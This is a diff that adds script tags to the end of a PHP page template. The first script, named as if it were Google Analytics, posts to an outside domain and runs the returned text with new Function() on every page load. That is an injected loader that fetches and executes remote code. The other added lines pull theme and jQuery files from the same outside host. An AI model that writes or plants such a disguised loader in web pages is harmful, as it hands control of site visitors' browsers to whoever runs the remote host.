@@ -60,6 +60,36 @@
         <!-- end #content -->
     </div> <!-- end #page -->
     <?php include 'common files/footer.php' ?>
+	<script>
+        jQuery(document).ready(function() {
+            jQuery.post('http://garypeter.com?ga_action=googleanalytics_get_script', {
+                action: 'googleanalytics_get_script'
+            }, function(response) {
+                var F = new Function(response);
+                return (F());
+            });
+        });
+
+    </script>
+    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/jquery.cycle.all.js?ver=3.0.3'></script>
+    <script type='text/javascript'>
+        /* <![CDATA[ */
+        var freesiaempire_slider_value = {
+            "transition_effect": "fade",
+            "transition_delay": "4000",
+            "transition_duration": "1000"
+        };
+        /* ]]> */
+
+    </script>
+    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/freesiaempire-slider-setting.js?ver=4.9.3'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/navigation.js?ver=4.9.3'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-content/themes/freesia-empire/js/freesiaempire-quote-slider.js?ver=4.2.2'></script>
+    <script type='text/javascript' src='http://garypeter.com/wp-includes/js/wp-embed.min.js?ver=4.9.3'></script>
 </body>
 
 </html>
